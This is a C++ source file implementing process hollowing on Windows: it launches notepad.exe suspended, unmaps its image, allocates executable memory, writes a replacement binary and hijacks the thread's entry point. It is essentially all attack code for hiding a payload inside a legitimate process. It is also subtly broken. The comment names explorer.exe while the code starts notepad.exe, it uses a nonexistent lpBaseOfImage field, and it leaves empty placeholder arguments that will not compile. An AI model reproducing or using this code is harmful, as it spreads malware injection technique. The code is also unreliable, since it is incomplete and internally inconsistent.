#include <windows.h>
#include <tlhelp32.h>
#include <iostream>

int main() {
    // Target process, in this example it's explorer.exe
    LPCSTR targetProcess = "explorer.exe";
    
    // Start a new process in a suspended state
    STARTUPINFO si = {0};
    PROCESS_INFORMATION pi = {0};
    si.cb = sizeof(si);
    
    if (!CreateProcessA(NULL, (LPSTR)"C:\\Windows\\System32\\notepad.exe", NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
        std::cerr << "Failed to start process. Error: " << GetLastError() << std::endl;
        return 1;
    }

    // Get handle to target process
    HANDLE hTargetProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pi.dwProcessId);
    if (hTargetProcess == NULL) {
        std::cerr << "Failed to open target process. Error: " << GetLastError() << std::endl;
        return 1;
    }

    // Unmap target process's memory
    HMODULE hNtDll = GetModuleHandleA("ntdll.dll");
    if (!hNtDll) {
        std::cerr << "Failed to get ntdll handle" << std::endl;
        return 1;
    }
    
    // NtUnmapViewOfSection is called to unmap the original image of the process
    typedef LONG(NTAPI *NtUnmapViewOfSection)(HANDLE, PVOID);
    NtUnmapViewOfSection pNtUnmapViewOfSection = (NtUnmapViewOfSection)GetProcAddress(hNtDll, "NtUnmapViewOfSection");
    
    if (pNtUnmapViewOfSection(hTargetProcess, pi.lpBaseOfImage)) {
        std::cerr << "Failed to unmap target process. Error: " << GetLastError() << std::endl;
        return 1;
    }
    
    // Allocate memory for the new image in the target process
    LPVOID pRemoteImage = VirtualAllocEx(hTargetProcess, pi.lpBaseOfImage, /*size of new image*/, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    
    if (!pRemoteImage) {
        std::cerr << "Failed to allocate memory in target process. Error: " << GetLastError() << std::endl;
        return 1;
    }

    // Write the new image to the allocated memory (this step would involve reading the new binary and copying it)
    WriteProcessMemory(hTargetProcess, pRemoteImage, /*binary data*/, /*size*/, NULL);

    // Set the context of the thread to start execution from the entry point of the new image
    CONTEXT ctx;
    ctx.ContextFlags = CONTEXT_FULL;
    GetThreadContext(pi.hThread, &ctx);
    ctx.Eip = (DWORD)pRemoteImage; // For 32-bit

    SetThreadContext(pi.hThread, &ctx);
    ResumeThread(pi.hThread);

    // Clean up
    CloseHandle(pi.hThread);
    CloseHandle(hTargetProcess);

    return 0;
}
